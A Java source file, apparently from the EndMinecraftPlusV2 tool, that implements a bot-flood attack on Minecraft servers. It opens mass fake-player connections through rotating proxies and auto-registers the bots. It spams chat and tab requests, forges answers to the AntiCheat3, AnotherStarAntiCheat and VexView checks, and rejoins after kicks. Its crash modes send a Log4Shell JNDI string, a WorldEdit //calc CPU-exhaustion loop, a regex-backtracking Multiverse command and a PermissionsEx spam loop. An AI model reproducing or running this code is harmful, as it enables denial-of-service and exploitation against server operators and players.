package cn.serendipityr.EndMinecraftPlusV2.VersionControl.NewVersion.AttackUtils;

import cn.serendipityr.EndMinecraftPlusV2.EndMinecraftPlusV2;
import cn.serendipityr.EndMinecraftPlusV2.Tools.*;
import cn.serendipityr.EndMinecraftPlusV2.VersionControl.*;
import cn.serendipityr.EndMinecraftPlusV2.VersionControl.NewVersion.ACProtocol.AnotherStarAntiCheat;
import cn.serendipityr.EndMinecraftPlusV2.VersionControl.NewVersion.ACProtocol.AntiCheat3;
import cn.serendipityr.EndMinecraftPlusV2.VersionControl.NewVersion.ForgeProtocol.MCForge;
import com.github.steveice10.mc.protocol.packet.ingame.client.ClientChatPacket;
import com.github.steveice10.mc.protocol.packet.ingame.client.ClientKeepAlivePacket;
import com.github.steveice10.mc.protocol.packet.ingame.client.ClientPluginMessagePacket;
import com.github.steveice10.mc.protocol.packet.ingame.client.player.ClientPlayerMovementPacket;
import com.github.steveice10.mc.protocol.packet.ingame.clientbound.ClientboundCustomPayloadPacket;
import com.github.steveice10.mc.protocol.packet.ingame.clientbound.ClientboundKeepAlivePacket;
import com.github.steveice10.mc.protocol.packet.ingame.clientbound.ClientboundLoginPacket;
import com.github.steveice10.mc.protocol.packet.ingame.clientbound.entity.player.ClientboundPlayerPositionPacket;
import com.github.steveice10.mc.protocol.packet.ingame.server.ServerChatPacket;
import com.github.steveice10.mc.protocol.packet.ingame.server.ServerJoinGamePacket;
import com.github.steveice10.mc.protocol.packet.ingame.server.ServerKeepAlivePacket;
import com.github.steveice10.mc.protocol.packet.ingame.server.ServerPluginMessagePacket;
import com.github.steveice10.mc.protocol.packet.ingame.server.entity.player.ServerPlayerPositionRotationPacket;
import com.github.steveice10.mc.protocol.packet.ingame.serverbound.ServerboundCustomPayloadPacket;
import com.github.steveice10.mc.protocol.packet.ingame.serverbound.ServerboundKeepAlivePacket;
import com.github.steveice10.mc.protocol.packet.ingame.serverbound.player.ServerboundMovePlayerStatusOnlyPacket;
import com.github.steveice10.packetlib.ProxyInfo;
import com.github.steveice10.packetlib.Session;
import com.github.steveice10.packetlib.event.session.*;
import com.github.steveice10.packetlib.packet.Packet;
import io.netty.util.internal.ConcurrentSet;
import net.kyori.adventure.text.Component;
import net.kyori.adventure.text.serializer.plain.PlainTextComponentSerializer;

import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.Socket;
import java.util.*;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class NewBotAttack extends IAttack {
    public static HashMap<Session, String> clientName = new HashMap<>();
    public static int failed = 0;
    public static int rejoin = 0;
    public static int clickVerifies = 0;
    public static List<Session> alivePlayers = new ArrayList<>();
    public static List<String> rejoinPlayers = new ArrayList<>();
    public static List<Session> joinedPlayers = new ArrayList<>();
    public static HashMap<Session,ServerPlayerPositionRotationPacket> positionPacket = new HashMap<>();
    public static HashMap<Session,ClientboundPlayerPositionPacket> newPositionPacket = new HashMap<>();
    protected boolean attack_motdbefore;
    protected boolean attack_tab;
    protected Map<String, String> modList;

    private Thread mainThread;
    private Thread taskThread;

    public Set<Session> clients = new ConcurrentSet<>();
    public ExecutorService pool = Executors.newCachedThreadPool();

    private static final AntiCheat3 ac3 = new AntiCheat3();
    private static final AnotherStarAntiCheat asac = new AnotherStarAntiCheat();

    private long starttime;

    public NewBotAttack(String ip, int port, int time, int maxconnect, long joinsleep) {
        super(ip, port, time, maxconnect, joinsleep);
    }

    public void setBotConfig(boolean motdbefore, boolean tab, Map<String, String> modList) {
        this.attack_motdbefore = motdbefore;
        this.attack_tab = tab;
        this.modList = modList;
    }

    public String getRandMessage(String userName) {
        return ConfigUtil.CustomChat.get(new Random().nextInt(ConfigUtil.CustomChat.size())).replace("$rnd",OtherUtils.getRandomString(4,6).replace("$pwd",DataUtil.botRegPasswordsMap.get(userName)));
    }

    public void start() {
        setTask(() -> {
            while (true) {
                List<Session> tempList = new ArrayList<>(alivePlayers);

                for (Session c:tempList) {
                    if (c.isConnected()) {
                        if (c.hasFlag("login")) {
                            if (ConfigUtil.ChatSpam && !c.hasFlag("chatSpam")) {
                                c.setFlag("chatSpam", true);

                                while (c.isConnected()) {
                                    try {
                                        if (ProtocolLibs.adaptAfter760) {
                                            VersionSupport760.sendChatPacket(c, getRandMessage(clientName.get(c)));
                                        } else if (ProtocolLibs.adaptAfter759) {
                                            VersionSupport759.sendChatPacket(c, getRandMessage(clientName.get(c)));
                                        } else if (ProtocolLibs.adaptAfter758) {
                                            VersionSupport758.sendChatPacket(c, getRandMessage(clientName.get(c)));
                                        } else {
                                            c.send(new ClientChatPacket(getRandMessage(clientName.get(c))));
                                        }
                                    } catch (Exception ignored) {}

                                    OtherUtils.doSleep(ConfigUtil.ChatDelay);
                                }
                            }

                            if (ConfigUtil.RandomTeleport && !c.hasFlag("randomTeleport")) {
                                c.setFlag("randomTeleport", true);

                                new Thread(() -> {
                                    while (c.isConnected()) {
                                        if (ProtocolLibs.adaptAfter758) {
                                            ClientboundPlayerPositionPacket positionRotationPacket = newPositionPacket.get(c);

                                            if (c.isConnected() && positionRotationPacket != null) {
                                                VersionSupport758.sendPosPacket(c, positionRotationPacket.getX() + OtherUtils.getRandomInt(-10, 10), positionRotationPacket.getY() + OtherUtils.getRandomInt(2, 8), positionRotationPacket.getZ() + OtherUtils.getRandomInt(-10, 10), OtherUtils.getRandomFloat(0.00, 1.00), OtherUtils.getRandomFloat(0.00, 1.00));
                                                OtherUtils.doSleep(500);
                                                VersionSupport758.sendPosPacket(c, positionRotationPacket.getX(), positionRotationPacket.getY(), positionRotationPacket.getZ(), OtherUtils.getRandomFloat(0.00, 1.00), OtherUtils.getRandomFloat(0.00, 1.00));
                                            } else {
                                                OtherUtils.doSleep(1000);
                                            }
                                        } else {
                                            ServerPlayerPositionRotationPacket positionRotationPacket = positionPacket.get(c);

                                            if (c.isConnected() && positionRotationPacket != null) {
                                                cn.serendipityr.EndMinecraftPlusV2.VersionControl.NewVersion.AttackUtils.MultiVersionPacket.sendPosPacket(c, positionRotationPacket.getX() + OtherUtils.getRandomInt(-10, 10), positionRotationPacket.getY() + OtherUtils.getRandomInt(2, 8), positionRotationPacket.getZ() + OtherUtils.getRandomInt(-10, 10), OtherUtils.getRandomFloat(0.00, 1.00), OtherUtils.getRandomFloat(0.00, 1.00));
                                                OtherUtils.doSleep(500);
                                                cn.serendipityr.EndMinecraftPlusV2.VersionControl.NewVersion.AttackUtils.MultiVersionPacket.sendPosPacket(c, positionRotationPacket.getX(), positionRotationPacket.getY(), positionRotationPacket.getZ(), OtherUtils.getRandomFloat(0.00, 1.00), OtherUtils.getRandomFloat(0.00, 1.00));
                                            } else {
                                                OtherUtils.doSleep(1000);
                                            }
                                        }
                                    }
                                }).start();
                            }

                            if (ConfigUtil.ServerCrasher && !c.hasFlag("crasher")) {
                                c.setFlag("crasher", true);

                                LogUtil.doLog(0, "[" + clientName.get(c) + "] 开始发送Crash Packet...", "ServerCrasher");

                                new Thread(() -> {
                                    switch (ConfigUtil.ServerCrasherMode) {
                                        case 1:
                                            LogUtil.doLog(0, "Book Crash仅适用于1.8.X版本。", "ServerCrasher");
                                            break;
                                        case 2:
                                            String log4jExploit = "${jndi:ldap://192.168.${RandomUtils.nextInt(1,253)}.${RandomUtils.nextInt(1,253)}}";

                                            if (ProtocolLibs.adaptAfter760) {
                                                VersionSupport760.sendChatPacket(c, log4jExploit);
                                            } else if (ProtocolLibs.adaptAfter759) {
                                                VersionSupport759.sendChatPacket(c, log4jExploit);
                                            } else if (ProtocolLibs.adaptAfter758) {
                                                VersionSupport758.sendChatPacket(c, log4jExploit);
                                            } else {
                                                c.send(new ClientChatPacket(log4jExploit));
                                            }
                                            break;
                                        case 3:
                                            String worldEdit = "//calc for(i=0;i<256;i++){for(a=0;a<256;a++){for(b=0;b<256;b++){for(c=0;c<255;c++){}}}}";

                                            if (ProtocolLibs.adaptAfter760) {
                                                VersionSupport760.sendChatPacket(c, worldEdit);
                                            } else if (ProtocolLibs.adaptAfter759) {
                                                VersionSupport759.sendChatPacket(c, worldEdit);
                                            } else if (ProtocolLibs.adaptAfter758) {
                                                VersionSupport758.sendChatPacket(c, worldEdit);
                                            } else {
                                                c.send(new ClientChatPacket(worldEdit));
                                            }

                                            break;
                                        case 4:
                                            String multiverseCore = "/mv ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.++)$^";

                                            if (ProtocolLibs.adaptAfter760) {
                                                VersionSupport760.sendChatPacket(c, multiverseCore);
                                            } else if (ProtocolLibs.adaptAfter759) {
                                                VersionSupport759.sendChatPacket(c, multiverseCore);
                                            } else if (ProtocolLibs.adaptAfter758) {
                                                VersionSupport758.sendChatPacket(c, multiverseCore);
                                            } else {
                                                c.send(new ClientChatPacket(multiverseCore));
                                            }

                                            break;
                                        case 5:
                                            String pex_1 = "/pex promote a a";
                                            String pex_2 = "/pex demote a a";
                                            while (c.isConnected()) {
                                                if (ProtocolLibs.adaptAfter760) {
                                                    VersionSupport760.sendChatPacket(c, new Random().nextBoolean() ? pex_1:pex_2);
                                                } else if (ProtocolLibs.adaptAfter759) {
                                                    VersionSupport759.sendChatPacket(c, new Random().nextBoolean() ? pex_1:pex_2);
                                                } else if (ProtocolLibs.adaptAfter758) {
                                                    VersionSupport758.sendChatPacket(c, new Random().nextBoolean() ? pex_1:pex_2);
                                                } else {
                                                    c.send(new ClientChatPacket(new Random().nextBoolean() ? pex_1:pex_2));
                                                }

                                                OtherUtils.doSleep(2000);
                                            }
                                            break;
                                        default:
                                            LogUtil.doLog(1, "ServerCrasher Mode设置有误，请检查配置文件。", null);
                                            break;
                                    }
                                }).start();
                            }

                            if (ConfigUtil.TabAttack && !c.hasFlag("tabAttack")) {
                                c.setFlag("tabAttack", true);

                                new Thread(() -> {
                                    while (c.isConnected()) {
                                        if (ProtocolLibs.adaptAfter758) {
                                            VersionSupport758.sendTabPacket(c, "/");
                                        } else {
                                            MultiVersionPacket.sendTabPacket(c, "/");
                                        }
                                        OtherUtils.doSleep(100);
                                    }
                                }).start();
                            }
                        } else if (c.hasFlag("join")) {
                            if (ConfigUtil.RegisterAndLogin) {
                                try {
                                    for (String cmd:ConfigUtil.RegisterCommands) {
                                        OtherUtils.doSleep(ConfigUtil.ChatDelay);

                                        if (ProtocolLibs.adaptAfter760) {
                                            VersionSupport760.sendChatPacket(c, cmd.replace("$pwd",DataUtil.botRegPasswordsMap.get(clientName.get(c))));
                                        } else if (ProtocolLibs.adaptAfter759) {
                                            VersionSupport759.sendChatPacket(c, cmd.replace("$pwd",DataUtil.botRegPasswordsMap.get(clientName.get(c))));
                                        } else if (ProtocolLibs.adaptAfter758) {
                                            VersionSupport758.sendChatPacket(c, cmd.replace("$pwd",DataUtil.botRegPasswordsMap.get(clientName.get(c))));
                                        } else {
                                            c.send(new ClientChatPacket(cmd.replace("$pwd",DataUtil.botRegPasswordsMap.get(clientName.get(c)))));
                                        }
                                    }

                                    LogUtil.doLog(0, "[" + clientName.get(c) + "] 注册信息已发送。", "BotAttack");

                                    c.setFlag("login", true);
                                } catch (Exception ignored) {}
                            } else {
                                c.setFlag("login", true);
                            }
                        }
                    } else {
                        alivePlayers.remove(c);
                    }
                }
            }
        });

        this.starttime = System.currentTimeMillis();

        mainThread = new Thread(() -> {
            while (true) {
                try {
                    createClients(ip, port);

                    if (this.attack_time > 0 && (System.currentTimeMillis() - this.starttime) / 1000 > this.attack_time) {
                        for (Session c : clients) {
                            c.disconnect("");
                        }
                        stop();
                        return;
                    }

                    OtherUtils.doSleep(ConfigUtil.ConnectTimeout);
                    LogUtil.doLog(0, "当前连接数: " + clients.size() + "个", "BotAttack");
                    cleanClients();
                } catch (Exception e) {
                    LogUtil.doLog(1, "发生错误: " + e, null);
                }
            }
        });

        mainThread.start();
        if (taskThread != null) {
            taskThread.start();
        }
    }

    @SuppressWarnings("deprecation")
    public void stop() {
        mainThread.stop();
        if (taskThread != null) {
            taskThread.stop();
        }
    }

    public void setTask(Runnable task) {
        taskThread = new Thread(task);
    }

    private void cleanClients() {
        for (Session client:clients) {
            if (!client.isConnected()) {
                positionPacket.remove(client);
                alivePlayers.remove(client);
                clientName.remove(client);
                clients.remove(client);
            } else {
                if (!alivePlayers.contains(client) && (client.hasFlag("login") || client.hasFlag("join"))) {
                    alivePlayers.add(client);
                }
            }
        }
    }

    private void createClients(final String ip, int port) {
        Proxy.Type proxyType;
        switch (ConfigUtil.ProxyType) {
            case 3:
            case 2:
                proxyType = Proxy.Type.SOCKS;
                break;
            case 1:
            default:
                proxyType = Proxy.Type.HTTP;
                break;
        }

        while (clients.size() <= this.attack_maxconnect) {
            for (String p: ProxyUtil.proxies) {
                try {
                    if (!EndMinecraftPlusV2.isLinux) {
                        SetTitle.INSTANCE.SetConsoleTitleA("EndMinecraftPlusV2 - BotAttack | 当前连接数: " + clients.size() + "个 | 失败次数: " + failed + "次 | 成功加入: " + joinedPlayers.size() + "次 | 当前存活: " + alivePlayers.size() + "个 | 点击验证: " + clickVerifies + "次 | 重进尝试: " + rejoin);
                    }

                    String[] _p = p.split(":");
                    Proxy proxy = new Proxy(proxyType, new InetSocketAddress(_p[0], Integer.parseInt(_p[1])));
                    String[] User = AttackManager.getRandomUser().split("@");
                    Session client = createClient(ip, port, User[0], proxy);
                    client.setReadTimeout(Math.toIntExact(ConfigUtil.ConnectTimeout));
                    client.setWriteTimeout(Math.toIntExact(ConfigUtil.ConnectTimeout));
                    clientName.put(client, User[0]);
                    clients.add(client);

                    pool.submit(() -> {
                        if (this.attack_motdbefore) {
                            getMotd(proxy, ip, port);
                        }

                        client.connect(false);
                    });

                    if (this.attack_joinsleep > 0) {
                        OtherUtils.doSleep(attack_joinsleep);
                    }
                } catch (Exception e) {
                    LogUtil.doLog(1, "发生错误: " + e, null);
                }
            }
        }
    }

    public Session createClient(final String ip, int port, final String username, Proxy proxy) {
        Session client;

        String proxyStr = String.valueOf(proxy.address()).replace("/", "");
        String[] proxyAddress = proxyStr.split(":");
        ProxyInfo.Type proxyType;

        switch (ConfigUtil.ProxyType) {
            case 2:
                proxyType = ProxyInfo.Type.SOCKS4;
                break;
            case 3:
                proxyType = ProxyInfo.Type.SOCKS5;
                break;
            case 1:
            default:
                proxyType = ProxyInfo.Type.HTTP;
                break;
        }

        ProxyInfo proxyInfo = new ProxyInfo(proxyType, new InetSocketAddress(proxyAddress[0], Integer.parseInt(proxyAddress[1])));
        client = VersionSupport754.getSession(ip, port, username, proxyInfo);

        if (ConfigUtil.ForgeSupport) {
            modList.putAll(ConfigUtil.ForgeModList);
            new MCForge(client, this.modList).init();
        }

        client.addListener(new SessionListener() {
            public void packetReceived(PacketReceivedEvent e) {
                new Thread(() -> {
                    if (ProtocolLibs.adaptAfter758) {
                        newHandlePacket(e.getSession(), e.getPacket(), username);
                    } else {
                        handlePacket(e.getSession(), e.getPacket(), username);
                    }
                }).start();
            }

            public void packetReceived(Session session, Packet packet) {
                new Thread(() -> {
                    if (ProtocolLibs.adaptAfter758) {
                        newHandlePacket(session, packet, username);
                    } else {
                        handlePacket(session, packet, username);
                    }
                }).start();
            }

            public void packetSending(PacketSendingEvent packetSendingEvent) {

            }

            public void packetSent(Session session, Packet packet) {

            }

            public void packetSent(PacketSentEvent packetSentEvent) {

            }

            public void packetError(PacketErrorEvent packetErrorEvent) {

            }

            public void connected(ConnectedEvent e) {
                if (ConfigUtil.SaveWorkingProxy) {
                    ProxyUtil.saveWorkingProxy(proxy);
                }
            }

            public void disconnecting(DisconnectingEvent e) {
            }

            public void disconnected(DisconnectedEvent e) {
                new Thread(() -> {
                    String msg;

                    if (e.getCause() == null) {
                        msg = e.getReason();

                        if (ProtocolLibs.adaptAfter754) {
                            // Component component = GsonComponentSerializer.gson().deserialize(msg);
                            Component component = PlainTextComponentSerializer.plainText().deserialize(msg);
                            msg = PlainTextComponentSerializer.plainText().serialize(component);
                        }

                        LogUtil.doLog(0,"[假人断开连接] [" + username + "] " + msg, "BotAttack");

                        for (String rejoinDetect:ConfigUtil.RejoinDetect) {
                            if (rejoinPlayers.contains(username)) {
                                break;
                            }

                            if (msg.contains(rejoinDetect)) {
                                rejoinPlayers.add(username);

                                for (int i = 0; i < ConfigUtil.RejoinCount; i++) {
                                    OtherUtils.doSleep(ConfigUtil.RejoinDelay);

                                    Session rejoinClient = createClient(ConfigUtil.AttackAddress, ConfigUtil.AttackPort, username, proxy);
                                    rejoinClient.setReadTimeout(Math.toIntExact(ConfigUtil.ConnectTimeout));
                                    rejoinClient.setWriteTimeout(Math.toIntExact(ConfigUtil.ConnectTimeout));

                                    rejoin++;
                                    LogUtil.doLog(0,"[假人尝试重连] [" + username + "] [" + proxy + "]", "BotAttack");
                                    clientName.put(rejoinClient, username);
                                    clients.add(rejoinClient);
                                    rejoinClient.connect(false);

                                    if (rejoinClient.hasFlag("join") || rejoinClient.hasFlag("login")) {
                                        rejoinPlayers.remove(username);
                                        break;
                                    }
                                }

                                rejoinPlayers.remove(username);
                            }
                        }
                    } else if (ConfigUtil.ShowFails) {
                        LogUtil.doLog(0,"[假人断开连接] [" + username + "] " + e.getCause(), "BotAttack");
                    }

                    failed++;
                    alivePlayers.remove(client);
                }).start();
            }
        });
        return client;
    }

    public void getMotd(Proxy proxy, String ip, int port) {
        try {
            Socket socket = new Socket(proxy);
            socket.connect(new InetSocketAddress(ip, port));

            if (socket.isConnected()) {
                OutputStream out = socket.getOutputStream();
                out.write(new byte[]{0x07, 0x00, 0x05, 0x01, 0x30, 0x63, (byte) 0xDD, 0x01});
                out.write(new byte[]{0x01, 0x00});
                out.flush();
            }

            socket.close();
        } catch (Exception ignored) {}
    }

    protected void handlePacket(Session session, Packet recvPacket, String username) {
        if (recvPacket instanceof ServerPluginMessagePacket) {
            ServerPluginMessagePacket packet = (ServerPluginMessagePacket) recvPacket;
            switch (packet.getChannel()) {
                case "AntiCheat3.4.3":
                    String code = ac3.uncompress(packet.getData());
                    byte[] checkData = ac3.getCheckData("AntiCheat3.jar", code,
                            new String[]{"44f6bc86a41fa0555784c255e3174260"});
                    session.send(new ClientPluginMessagePacket("AntiCheat3.4.3", checkData));
                    break;
                case "anotherstaranticheat":
                    String salt = asac.decodeSPacket(packet.getData());
                    byte[] data = asac.encodeCPacket(new String[]{"4863f8708f0c24517bb5d108d45f3e15"}, salt);
                    session.send(new ClientPluginMessagePacket("anotherstaranticheat", data));
                    break;
                case "VexView":
                    if (new String(packet.getData()).equals("GET:Verification"))
                        session.send(new ClientPluginMessagePacket("VexView", "Verification:1.8.10".getBytes()));
                    break;
            }
        } else if (recvPacket instanceof ServerJoinGamePacket) {
            session.setFlag("join", true);
            LogUtil.doLog(0, "[假人加入服务器] [" + username + "]", "BotAttack");
            joinedPlayers.add(session);

            if (!alivePlayers.contains(session)) {
                alivePlayers.add(session);
            }

            MultiVersionPacket.sendClientSettingPacket(session, "zh_CN");
            MultiVersionPacket.sendClientPlayerChangeHeldItemPacket(session, 1);
        } else if (recvPacket instanceof ServerPlayerPositionRotationPacket) {
            try {
                ServerPlayerPositionRotationPacket packet = (ServerPlayerPositionRotationPacket) recvPacket;
                MultiVersionPacket.sendPosPacket(session, packet.getX(), packet.getY(), packet.getZ(), packet.getYaw(), packet.getYaw());
                session.send(new ClientPlayerMovementPacket(true));
                MultiVersionPacket.sendClientTeleportConfirmPacket(session, packet);
                positionPacket.put(session, packet);
            } catch (Exception ignored) {}

        } else if (recvPacket instanceof ServerChatPacket) {
            ServerChatPacket chatPacket = (ServerChatPacket) recvPacket;
            Map<String, String> result = VersionSupport754.clickVerifiesHandle(chatPacket, session, ConfigUtil.ClickVerifiesDetect, null);

            if (result.get("result").contains("true")) {
                LogUtil.doLog(0, "[服务端返回验证信息] [" + username + "] " + result.get("msg"), "BotAttack");
                clickVerifies++;
            }

            if (!joinedPlayers.contains(session)) {
                joinedPlayers.add(session);
            }

            if (ConfigUtil.ShowServerMessages && !result.get("msg").equals("")) {
                LogUtil.doLog(0, "[服务端返回信息] [" + username + "] " + result.get("msg"), "BotAttack");
            }
        } else if (recvPacket instanceof ServerKeepAlivePacket) {
            ClientKeepAlivePacket keepAlivePacket = new ClientKeepAlivePacket(((ServerKeepAlivePacket) recvPacket).getPingId());
            session.send(keepAlivePacket);
        }
    }

    protected void newHandlePacket(Session session, Packet recvPacket, String username) {
        if (recvPacket instanceof ClientboundCustomPayloadPacket) {
            ClientboundCustomPayloadPacket packet = (ClientboundCustomPayloadPacket) recvPacket;
            switch (packet.getChannel()) {
                case "AntiCheat3.4.3":
                    String code = ac3.uncompress(packet.getData());
                    byte[] checkData = ac3.getCheckData("AntiCheat3.jar", code,
                            new String[]{"44f6bc86a41fa0555784c255e3174260"});
                    session.send(new ServerboundCustomPayloadPacket("AntiCheat3.4.3", checkData));
                    break;
                case "anotherstaranticheat":
                    String salt = asac.decodeSPacket(packet.getData());
                    byte[] data = asac.encodeCPacket(new String[]{"4863f8708f0c24517bb5d108d45f3e15"}, salt);
                    session.send(new ServerboundCustomPayloadPacket("anotherstaranticheat", data));
                    break;
                case "VexView":
                    if (new String(packet.getData()).equals("GET:Verification"))
                        session.send(new ServerboundCustomPayloadPacket("VexView", "Verification:1.8.10".getBytes()));
                    break;
                default:
            }
        } else if (recvPacket instanceof ClientboundLoginPacket) {
            session.setFlag("join", true);
            LogUtil.doLog(0, "[假人加入服务器] [" + username + "]", "BotAttack");
            joinedPlayers.add(session);

            if (!alivePlayers.contains(session)) {
                alivePlayers.add(session);
            }

            VersionSupport758.sendClientSettingPacket(session, "zh_CN");
            VersionSupport758.sendClientPlayerChangeHeldItemPacket(session, 1);
        } else if (recvPacket instanceof ClientboundKeepAlivePacket) {
            ServerboundKeepAlivePacket keepAlivePacket = new ServerboundKeepAlivePacket(((ClientboundKeepAlivePacket) recvPacket).getPingId());
            session.send(keepAlivePacket);
            if (!alivePlayers.contains(session)) {
                alivePlayers.add(session);
            }
        } else if (recvPacket instanceof ClientboundPlayerPositionPacket) {
            try {
                ClientboundPlayerPositionPacket packet = (ClientboundPlayerPositionPacket) recvPacket;
                VersionSupport758.sendPosPacket(session, packet.getX(), packet.getY(), packet.getZ(), packet.getYaw(), packet.getYaw());
                session.send(new ServerboundMovePlayerStatusOnlyPacket(true));
                VersionSupport758.sendClientTeleportConfirmPacket(session, packet);
                newPositionPacket.put(session,packet);
            } catch (Exception ignored) {}
        } else if (ProtocolLibs.adaptAfter760 && VersionSupport760.checkServerChatPacket(recvPacket)) {
            Map<String, String> result = VersionSupport760.clickVerifiesHandle(recvPacket, session, ConfigUtil.ClickVerifiesDetect, null);

            if (result.get("result").contains("true")) {
                LogUtil.doLog(0, "[服务端返回验证信息] [" + username + "] " + result.get("msg"), "BotAttack");
                clickVerifies++;
            }

            if (!joinedPlayers.contains(session)) {
                joinedPlayers.add(session);
            }

            if (ConfigUtil.ShowServerMessages) {
                LogUtil.doLog(0, "[服务端返回信息] [" + username + "] " + result.get("msg"), "BotAttack");
            }
        } else if (VersionSupport759.checkServerChatPacket(recvPacket)) {
            Map<String, String> result = VersionSupport759.clickVerifiesHandle(recvPacket, session, ConfigUtil.ClickVerifiesDetect, null);

            if (result.get("result").contains("true")) {
                LogUtil.doLog(0, "[服务端返回验证信息] [" + username + "] " + result.get("msg"), "BotAttack");
                clickVerifies++;
            }

            if (!joinedPlayers.contains(session)) {
                joinedPlayers.add(session);
            }

            if (ConfigUtil.ShowServerMessages) {
                LogUtil.doLog(0, "[服务端返回信息] [" + username + "] " + result.get("msg"), "BotAttack");
            }
        } else if (VersionSupport758.checkServerChatPacket(recvPacket)) {
            Map<String, String> result = VersionSupport758.clickVerifiesHandle(recvPacket, session, ConfigUtil.ClickVerifiesDetect, null);

            if (result.get("result").contains("true")) {
                LogUtil.doLog(0, "[服务端返回验证信息] [" + username + "] " + result.get("msg"), "BotAttack");
                clickVerifies++;
            }

            if (!joinedPlayers.contains(session)) {
                joinedPlayers.add(session);
            }

            if (ConfigUtil.ShowServerMessages) {
                LogUtil.doLog(0, "[服务端返回信息] [" + username + "] " + result.get("msg"), "BotAttack");
            }
        }
    }
}
